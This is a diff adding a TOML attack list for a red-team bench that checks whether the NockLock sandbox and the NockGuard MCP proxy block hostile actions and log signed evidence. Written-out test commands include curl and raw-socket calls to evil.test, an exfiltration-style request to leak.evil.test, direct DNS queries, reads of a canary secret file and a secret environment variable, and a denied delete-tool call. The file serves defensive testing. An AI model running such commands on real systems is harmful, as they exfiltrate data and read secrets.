@@ -1,0 +1,162 @@
+# Scripted attack list for the NockLock + NockGuard red-team bench (N11623).
+#
+# Every entry runs as `/bin/sh -c <cmd>` inside its own `nocklock wrap
+# --net-fence=netns` session. The exit status of cmd is the verdict: 0 means the
+# attack GOT WHAT IT WANTED (breach), non-zero means it was stopped. The two
+# controls flip that: they must exit 0 and be logged as allowed.
+#
+# Placeholders: @WORK@ (bench scratch dir), @BIN@ (read-only tool dir with the
+# nockguard binary and the MCP helpers), @POLICY@ (the NockGuard policy file).
+#
+# Proof fields name the signed row that must exist for the attempt:
+#   evidence = "nocklock"  -> a row in the NockLock Ed25519 audit chain
+#   evidence = "nockguard" -> an entry in the NockGuard Ed25519 audit trail
+#   event / rule / match   -> event type, a substring of the row's rule text,
+#                             and an optional substring naming the target.
+#   floor = true           -> the kernel floor (netns default-drop, seccomp)
+#                             stops the attempt before any proxy sees it, so
+#                             NockLock writes no per-attempt row today. The
+#                             pinned row is the session's signed fence-state row
+#                             proving that floor was armed. Reported as such.
+
+[[attack]]
+id = "egress-https-offlist"
+class = "off-allowlist-https"
+cmd = "curl -fsS -m 10 -o /dev/null https://evil.test/"
+expect = "blocked"
+evidence = "nocklock"
+event = "network_blocked"
+rule = "rule=disallowed_sni"
+match = "host=evil.test:443"
+
+[[attack]]
+id = "egress-http-offlist"
+class = "off-allowlist-http"
+cmd = "curl -fsS -m 10 -o /dev/null http://evil.test/"
+expect = "blocked"
+evidence = "nocklock"
+event = "network_blocked"
+rule = "rule=disallowed_host"
+match = "host=evil.test:80"
+
+[[attack]]
+id = "raw-socket-tcp-handrolled"
+class = "raw-socket"
+cmd = '''python3 -c "
+import socket, sys
+s = socket.create_connection((socket.gethostbyname('evil.test'), 443), 5)
+s.send(b'\x16\x03\x01not-a-real-handshake')
+s.settimeout(5)
+try:
+    data = s.recv(100)
+except socket.timeout:
+    data = b''
+sys.exit(0 if data else 1)"'''
+expect = "blocked"
+evidence = "nocklock"
+event = "network_blocked"
+rule = "rule=disallowed_sni"
+match = "host=:443"
+
+[[attack]]
+id = "raw-socket-af-packet"
+class = "raw-socket"
+cmd = '''python3 -c "import socket; socket.socket(socket.AF_PACKET, socket.SOCK_RAW)"'''
+expect = "blocked"
+floor = true
+evidence = "nocklock"
+event = "file_passed"
+rule = "seccomp mode=required"
+
+[[attack]]
+id = "dns-direct-resolver"
+class = "direct-dns-query"
+cmd = '''python3 -c "
+import socket, sys
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.settimeout(3)
+s.sendto(b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01', ('8.8.8.8', 53))
+s.recvfrom(512)
+sys.exit(0)"'''
+expect = "blocked"
+floor = true
+evidence = "nocklock"
+event = "network_passed"
+rule = "egress level=KERNEL netns"
+
+[[attack]]
+id = "dns-exfil-via-stub"
+class = "direct-dns-query"
+cmd = '''python3 -c "
+import socket, sys
+s = socket.create_connection((socket.gethostbyname('leak.evil.test'), 80), 5)
+s.send(b'GET /?d=leaked HTTP/1.0\r\nHost: leak.evil.test\r\n\r\n')
+s.settimeout(5)
+sys.exit(0 if s.recv(100).startswith(b'HTTP/1.1 200') else 1)"'''
+expect = "blocked"
+evidence = "nocklock"
+event = "network_blocked"
+rule = "rule=disallowed_host"
+match = "host=leak.evil.test:80"
+
+[[attack]]
+id = "secret-file-read"
+class = "secret-file-read"
+cmd = "cat @WORK@/outside/canary.txt"
+expect = "blocked"
+evidence = "nocklock"
+event = "file_blocked"
+rule = "reason=outside allowed directory"
+match = "canary.txt"
+
+[[attack]]
+id = "secret-env-read"
+class = "secret-env-read"
+cmd = 'test -n "$BENCH_SECRET_TOKEN"'
+expect = "blocked"
+evidence = "nocklock"
+event = "secret_blocked"
+rule = "BENCH_SECRET_TOKEN"
+
+[[attack]]
+id = "write-outside-root"
+class = "write-outside-fence-root"
+cmd = "echo x > @WORK@/outside/planted.txt"
+expect = "blocked"
+absent = "@WORK@/outside/planted.txt"
+evidence = "nocklock"
+event = "file_blocked"
+rule = "reason=outside allowed directory"
+match = "planted.txt"
+
+[[attack]]
+id = "mcp-tools-call-denied"
+class = "mcp-denied-tool"
+cmd = '''python3 @BIN@/mcp_client.py files_delete -- @BIN@/nockguard proxy --upstream "python3 @BIN@/mcp_upstream.py" --agent bench --policy @POLICY@'''
+expect = "blocked"
+evidence = "nockguard"
+tool = "files_delete"
+decision = "deny"
+rule = 'deny-rule "*delete*"'
+
+# Negative controls: allowed actions must succeed and be logged as allowed. A
+# bench that blocks everything proves nothing.
+[[attack]]
+id = "control-egress-allowlisted"
+class = "negative-control"
+cmd = "curl -fsS -m 20 -o /dev/null https://example.com/"
+expect = "allowed"
+evidence = "nocklock"
+event = "network_passed"
+rule = "rule=allowlisted"
+match = "host=example.com:443"
+
+[[attack]]
+id = "control-mcp-allowed-tool"
+class = "negative-control"
+cmd = '''python3 @BIN@/mcp_client.py docs_get -- @BIN@/nockguard proxy --upstream "python3 @BIN@/mcp_upstream.py" --agent bench --policy @POLICY@'''
+expect = "allowed"
+evidence = "nockguard"
+tool = "docs_get"
+decision = "allow"
+rule = 'allow-rule "docs_get"'
